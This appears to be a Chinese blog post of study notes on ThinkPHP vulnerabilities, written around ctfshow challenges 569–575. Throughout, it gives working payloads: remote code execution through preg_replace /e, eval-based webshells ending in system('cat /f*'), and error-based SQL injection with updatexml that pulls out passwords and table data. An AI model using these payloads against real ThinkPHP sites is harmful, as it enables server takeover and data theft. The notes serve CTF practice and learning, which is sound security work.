---
title: thinkphp框架
date: 2022-02-25 14:02:30
author: Na0H
hidden: true
tags:	
- 学习笔记
- ctfshow
categories:
- 学习笔记
excerpt: thinkphp框架
description:  thinkphp框架

---

<!-- more -->

太久没学习了。。就打算学习一下thinkphp这个框架，简单跟着人家审计一下

[ThinkPHP系列专题相关POC及CTFshow---ThinkPHP专题（569-579 604-626）解题思路 - Bit's Blog (xl-bit.cn)](https://www.xl-bit.cn/index.php/archives/628/)





# ThinkPHP 2.x 任意代码执行漏洞



- php版本<=5.6.29

- 成因是preg_replace()使用了修饰符/e匹配路由，导致用户的输入参数被插入双引号中执行，造成任意代码执行漏洞。

  ThinkPHP 3.0版本因为Lite模式下没有修复该漏洞，也存在这个漏洞。
  
  ```php
  #./ThinkPHP/Lib/Think/Util/Dispatcher.class.php:102: 
  $res = preg_replace('@(\w+)'.$depr.'([^'.$depr.'\/]+)@e', '$var[\'\\1\']="\\2";', implode($depr,$paths));
  ```
  

具体分析：

[ThinkPHP系列漏洞之ThinkPHP 2.x 任意代码执行 - FreeBuf网络安全行业门户](https://www.freebuf.com/sectool/223149.html)

[preg_replace的/e修饰符妙用与慎用 - WiFeng的博客 (521-wf.com)](https://521-wf.com/archives/45.html)

[PHP-Audit-Labs/README.md at master · hongriSec/PHP-Audit-Labs (github.com)](https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day8/files/README.md)

payload：

```
/index.php?s=/index/index/name/${phpinfo()}
```

getshell：

```
/index.php?s=/index/index/name/${eval($_REQUEST[8])}&&8=phpinfo();
```





# Thinkphp3

[ThinkPHP3.2.3完全开发手册](https://www.kancloud.cn/manual/thinkphp/1678)

> thinkphp3版本路由格式:
>
> ```
> http://serverName/index.php/模块/控制器/方法/参数
> ```

[ThinkPHP3.2.3SQL注入分析 - Pan3a - 博客园 (cnblogs.com)](https://www.cnblogs.com/Pan3a/p/14873308.html)

## Thinkphp3.2.3 SQL注入

### where

payload:

```
?id[where]=1 and 1=updatexml(1,concat(0x7e,(select password from users limit 1),0x7e),1)%23
```













# ctfshow-thinkphp

## 569-pathinfo的运用

```
http://serverName/index.php/模块/控制器/方法/参数
```

payload:

```
url/index.php/Admin/Login/ctfshowLogin
```

## 570-闭包路由

```php
# Application/Common/Conf/config.php
    'ctfshow/:f/:a' =>function($f,$a){
    	call_user_func($f, $a);
    	}
    )
```

[闭包支持 · ThinkPHP3.2.3完全开发手册 · 看云 (kancloud.cn)](https://www.kancloud.cn/manual/thinkphp/1710)

payload:

```
url/index.php/ctfshow/assert/assert($_GET[1])?1=system('cat /f*')
```

## 571-控制器

[控制器定义 · ThinkPHP3.2.3完全开发手册](https://www.kancloud.cn/manual/thinkphp/1713)

一般来说，ThinkPHP的控制器是一个类，而操作则是控制器类的一个**公共方法**。

简单审计一下：

```php
# Application\Home\Controller\IndexController.class.php
<?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller {
    public function index($n=''){
        $this->show('<style type="text/css">*{ padding: 0; margin: 0; } div{ padding: 4px 48px;} body{ background: #fff; font-family: "微软雅黑"; color: #333;font-size:24px} h1{ font-size: 100px; font-weight: normal; margin-bottom: 12px; } p{ line-height: 1.8em; font-size: 36px } a,a:hover{color:blue;}</style><div style="padding: 24px 48px;"> <h1>CTFshow</h1><p>thinkphp 专项训练</p><p>hello,'.$n.'黑客建立了控制器后门，你能找到吗</p>','utf-8');
    }

}
```

该类就代表Home模块下的Index控制器，index操作就是访问该类中的index方法
即访问：`url/index.php/Home/Index/index/n/111`或`url/index.php/Home/Index/index/?n=111`

payload:

```
GET:
/index.php/Home/Index/index/?n=<?php eval($_POST[1]);?>

POST:
1=system('cat /f*');
```

## 572-debug模式访问log文件

> hint:**此题需要使用爆破来获得关键信息，非扫描，爆破次数不会超过365次，否则均为无效操作**

> [日志记录 · ThinkPHP3.2.3完全开发手册](https://www.kancloud.cn/manual/thinkphp/1827)
> 默认情况是debug模式下会记录日志，因此如果没有限制访问目录就容易出现文件泄露
> 且这个日志文件的命令规律是：年\_月\_日.log且日志文件是在\Application\Runtime\Logs\目录下的

bp爆破日志文件：

```
url/Application/Runtime/Logs/22_3_1.log
```

得到后门：`/index.php?showctf=<?php phpinfo();?>`

```
GET:
/index.php?showctf=<?php eval($_POST[1]);?>

POST:
1=system('cat /f*');
```

## 573-sql注入

[ThinkPHP3.2.3代码审计【find方法引起的SQL注入】_D.MIND 的博客-CSDN博客](https://blog.csdn.net/weixin_45669205/article/details/117429889)

```
?id[where]=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)

?id[where]=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flags'),0x7e),1)

?id[where]=1 and updatexml(1,concat(0x7e,substr((select flag4s from flags),1),0x7e),1)

```



## 574-sql注入

> ```php
> public function index($id=1){
> 	$name = M('Users')->where('id='.$id)->find();
> 	$this->show($html);
> }
> ```

```
?id=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)

?id=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='flags'),0x7e),1)

?id=1 and updatexml(1,concat(0x7e,substr((select flag4s from flags),1),0x7e),1)
```



## 575-反序列化POP链

> ```php
> $user= unserialize(base64_decode(cookie('user')));
> 	if(!$user || $user->id!==$id){
> 		$user = M('Users');
> 		$user->find(intval($id));
> 		cookie('user',base64_encode(serialize($user->data())));
> 	}
> 	$this->show($user->username);
> }
> ```
